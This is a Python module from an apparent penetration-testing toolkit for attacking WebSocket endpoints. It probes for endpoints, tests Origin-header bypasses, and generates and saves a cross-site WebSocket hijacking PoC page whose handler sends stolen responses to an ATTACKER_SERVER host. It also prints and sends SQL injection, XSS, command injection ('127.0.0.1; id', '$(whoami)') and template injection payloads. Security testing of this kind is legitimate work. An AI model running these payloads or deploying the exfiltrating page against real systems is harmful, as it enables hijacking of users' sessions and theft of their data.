"""
modules/websocket_security.py
tmrswrr - WebSocket Security Testing
CSWSH, origin bypass, message injection, TLS check
"""
import os
import re

from config.settings import OUTPUT_DIR, SESSION, add_vuln, save_session
from utils.helpers import (
    DIM,
    NEON_CYN,
    NEON_GRN,
    PURE_WHITE,
    RST,
    info,
    print_banner,
    prompt,
    run_cmd,
    section,
    success,
    warn,
)


def _out(name: str) -> str:
    d = str(OUTPUT_DIR)
    os.makedirs(d, exist_ok=True)
    return os.path.join(d, name)


def _target() -> str:
    url = SESSION.get("target_url", "")
    if not url:
        url = prompt("Target URL")
        SESSION["target_url"] = url
    return url


def ws_discovery():
    section("WEBSOCKET ENDPOINT DISCOVERY")
    url = _target()
    cookies = SESSION.get("cookies", "")
    cookie_flag = f'-H "Cookie: {cookies}"' if cookies else ""

    info("Scanning page source for WebSocket connections...")
    out, _, _ = run_cmd(f'curl -sk {url} {cookie_flag}', timeout=15)

    ws_patterns = [
        r'new WebSocket\(["\']([^"\']+)["\']',
        r'ws://[^\s"\'<>]+',
        r'wss://[^\s"\'<>]+',
        r'websocket.*?["\']([^"\']+)["\']',
        r'io\.connect\(["\']([^"\']+)["\']',
        r'socket\.connect\(["\']([^"\']+)["\']',
    ]

    found_urls = set()
    for pattern in ws_patterns:
        for m in re.finditer(pattern, out, re.I):
            ws_url = m.group(1) if m.lastindex else m.group(0)
            found_urls.add(ws_url.strip())

    if found_urls:
        success(f"Found {len(found_urls)} WebSocket endpoint(s):")
        for ws in found_urls:
            print(f"  {NEON_GRN}→{RST} {ws}")
            SESSION.setdefault("ws_endpoints", []).append(ws)
    else:
        info("No WebSocket URLs found in page source")
        info("Check JavaScript files and XHR requests in browser DevTools (Network → WS tab)")

    # Common WS paths
    ws_paths = ["/ws", "/socket", "/ws/", "/socket.io/", "/live", "/stream",
                "/chat", "/events", "/notifications", "/feed"]
    info("Probing common WebSocket paths...")
    for path in ws_paths:
        ws_url = url.replace("https://", "wss://").replace("http://", "ws://") + path
        out2, _, rc = run_cmd(
            f'curl -sk -o /dev/null -w "%{{http_code}}" '
            f'-H "Upgrade: websocket" -H "Connection: Upgrade" '
            f'-H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" '
            f'-H "Sec-WebSocket-Version: 13" {url}{path} -m 5'
        )
        code = out2.strip()
        if code in ("101", "200"):
            success(f"[{code}] WebSocket endpoint: {url}{path}")
            add_vuln("WebSocket Endpoint Found", "Info", "A05:2021",
                     f"WebSocket upgrade accepted at {path}", url + path)


def cswsh_test():
    section("CSWSH - Cross-Site WebSocket Hijacking")
    url = _target()

    ws_url = prompt("WebSocket URL (e.g. wss://target.com/ws) or Enter to derive from target")
    if not ws_url:
        ws_url = url.replace("https://", "wss://").replace("http://", "ws://") + "/ws"

    info("Testing WebSocket origin validation...")
    print(f"""
  {NEON_CYN}CSWSH Attack Explanation:{RST}
    WebSockets don't enforce SOP by default.
    If server doesn't validate Origin header → attacker page can connect!

  {NEON_CYN}Attack HTML (save as evil.html):{RST}
""")
    cookies = SESSION.get("cookies", "")
    evil_html = f"""<!DOCTYPE html>
<html>
<body>
<script>
// CSWSH PoC - runs when victim visits this page
var ws = new WebSocket("{ws_url}");
ws.onopen = function() {{
    console.log("Connected! Sending test message...");
    ws.send(JSON.stringify({{type: "get_user_data"}}));
}};
ws.onmessage = function(e) {{
    // Exfiltrate response to attacker
    fetch("https://ATTACKER_SERVER/?data=" + btoa(e.data));
    console.log("Server said:", e.data);
}};
ws.onerror = function(e) {{
    console.log("WS Error - Origin likely validated:", e);
}};
</script>
</body>
</html>"""

    print(f"{NEON_GRN}{evil_html}{RST}")
    out_file = _out("cswsh_poc.html")
    with open(out_file, "w") as f:
        f.write(evil_html)
    success(f"PoC saved → {out_file}")

    # Test origin bypass
    info("Testing with different Origin headers...")
    origins = [
        "https://evil.com",
        "null",
        url,
        "https://" + url.split("//")[-1].split("/")[0] + ".evil.com",
        "",
    ]

    for origin in origins:
        origin_flag = f'-H "Origin: {origin}"' if origin else ""
        out, _, _ = run_cmd(
            f'curl -sk -o /dev/null -w "%{{http_code}}" '
            f'-H "Upgrade: websocket" -H "Connection: Upgrade" '
            f'-H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" '
            f'-H "Sec-WebSocket-Version: 13" '
            f'{origin_flag} {url}/ws -m 5',
            timeout=8
        )
        code = out.strip()
        sym = NEON_GRN + "✓" + RST if code == "101" else DIM + "-" + RST
        print(f"  [{sym}] Origin: {origin or '(none)':<40} → HTTP {code}")
        if code == "101" and origin == "https://evil.com":
            success("CSWSH VULNERABILITY: Server accepts cross-origin WebSocket connections!")
            add_vuln("Cross-Site WebSocket Hijacking (CSWSH)", "High", "A01:2021",
                     "WebSocket accepts connections from arbitrary origins", url)


def ws_message_injection():
    section("WEBSOCKET MESSAGE INJECTION")
    url = _target()

    ws_url = prompt("WebSocket URL")
    if not ws_url:
        ws_url = url.replace("https://", "wss://").replace("http://", "ws://") + "/ws"

    print(f"""
  {NEON_CYN}WebSocket Message Injection Tests:{RST}

  {NEON_GRN}Using wscat (npm install -g wscat):{RST}
    wscat -c "{ws_url}" --header "Cookie: {SESSION.get('cookies','SESSION_COOKIE')}"

  {NEON_GRN}SQL Injection via WebSocket:{RST}
    Send: {{"query": "' OR 1=1--", "type": "search"}}
    Send: {{"id": "1 UNION SELECT 1,2,3--"}}

  {NEON_GRN}XSS via WebSocket (stored):{RST}
    Send: {{"message": "<script>alert(document.cookie)</script>"}}
    Send: {{"username": "<img src=x onerror=alert(1)>"}}

  {NEON_GRN}Command Injection via WebSocket:{RST}
    Send: {{"host": "127.0.0.1; id"}}
    Send: {{"cmd": "$(whoami)"}}

  {NEON_GRN}SSTI via WebSocket:{RST}
    Send: {{"template": "{{{{7*7}}}}"}}

  {NEON_GRN}Python websocket-client test:{RST}
    pip install websocket-client
    python3 -c "
import websocket, json
ws = websocket.create_connection('{ws_url}',
    header=['{f'Cookie: {SESSION.get("cookies","")}' if SESSION.get('cookies') else ''}'])
ws.send(json.dumps({{'type':'ping'}}))
print('Response:', ws.recv())
ws.close()
"
""")

    if __import__("shutil").which("wscat"):
        cookies = SESSION.get("cookies", "")
        cookie_flag = f"--header 'Cookie: {cookies}'" if cookies else ""
        payloads = [
            '{"type":"ping"}',
            '{"query":"test"}',
            '{"message":"<script>alert(1)</script>"}',
            '{"id":"1 OR 1=1"}',
        ]
        info("Testing WebSocket with wscat...")
        for p in payloads:
            out, _, _ = run_cmd(
                f"timeout 5 wscat -c '{ws_url}' {cookie_flag} "
                f"--execute '{p}' 2>&1 | head -5",
                timeout=8
            )
            print(f"  {NEON_CYN}→{RST} {p[:40]}:  {out[:100]}")
    else:
        warn("wscat not installed: npm install -g wscat")


def ws_tls_check():
    section("WEBSOCKET TLS / PROTOCOL SECURITY")
    url = _target()

    host = url.split("//")[-1].split("/")[0]

    print(f"""
  {NEON_CYN}WebSocket Security Checks:{RST}

  {NEON_GRN}[1] ws:// vs wss:// (cleartext):{RST}
    Cleartext WebSocket = MITM risk
""")

    # Check if HTTP → should use ws:// (unencrypted)
    if url.startswith("http://"):
        warn("Target uses HTTP - WebSocket connections would use ws:// (cleartext!)")
        add_vuln("Cleartext WebSocket (ws://)", "High", "A02:2021",
                 "Application on HTTP likely uses ws:// - no encryption", url)
    else:
        success("Target uses HTTPS - WebSocket should use wss://")

    print(f"""
  {NEON_GRN}[2] Test ws:// upgrade on HTTPS site:{RST}
    curl -sk -H "Upgrade: websocket" \\
         -H "Connection: Upgrade" \\
         http://{host}/ws

  {NEON_GRN}[3] Check for missing authentication:{RST}
    Connect WITHOUT session cookie and send authenticated messages
    wscat -c "wss://{host}/ws" (no cookie)

  {NEON_GRN}[4] Message format disclosure:{RST}
    Analyze frame content - look for sensitive data in messages:
    user IDs, tokens, internal paths, debug info
""")

    out, _, _ = run_cmd(
        f'curl -sk -H "Upgrade: websocket" -H "Connection: Upgrade" '
        f'-H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" '
        f'-H "Sec-WebSocket-Version: 13" '
        f'http://{host}/ws -w "\\nHTTP: %{{http_code}}" -m 5'
    )
    if "101" in out:
        warn("WebSocket upgrade accepted over HTTP (cleartext)!")
        add_vuln("WebSocket Upgrade over HTTP", "High", "A02:2021",
                 "Server accepts ws:// connections (no TLS)", url)


def run():
    print_banner("WEBSOCKET SECURITY",
                 "CSWSH · Message Injection · Origin Bypass · TLS")
    while True:
        url = SESSION.get("target_url", "-")
        print(f"""
  {NEON_GRN}Target:{RST} {PURE_WHITE}{url}{RST}

  {NEON_CYN}[1]{RST} WebSocket Endpoint Discovery
  {NEON_CYN}[2]{RST} CSWSH - Cross-Site WebSocket Hijacking
  {NEON_CYN}[3]{RST} Message Injection (SQLi, XSS, CMDi, SSTI)
  {NEON_CYN}[4]{RST} TLS & Protocol Security
  {NEON_GRN}[0]{RST} Back to main menu
""")
        c = prompt("Choice")
        if c == "0":
            break
        elif c == "1":
            ws_discovery()
        elif c == "2":
            cswsh_test()
        elif c == "3":
            ws_message_injection()
        elif c == "4":
            ws_tls_check()
        save_session()
